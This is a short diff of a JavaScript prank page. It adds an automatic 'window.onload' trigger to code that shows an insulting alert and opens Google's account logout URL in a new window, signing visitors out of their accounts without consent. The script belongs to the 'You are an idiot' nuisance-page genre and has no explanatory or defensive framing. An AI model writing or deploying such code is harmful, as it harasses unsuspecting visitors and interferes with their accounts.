@@ -8,7 +8,7 @@ window.onkeydown = async () => {
 	
 	return null;
 }
-
+window.onload = playBall;
 
 alert("YOU ARE AN IDIOT!! HGAHAHAHA");
 window.open("https://www.google.com/accounts/Logout","_blank")
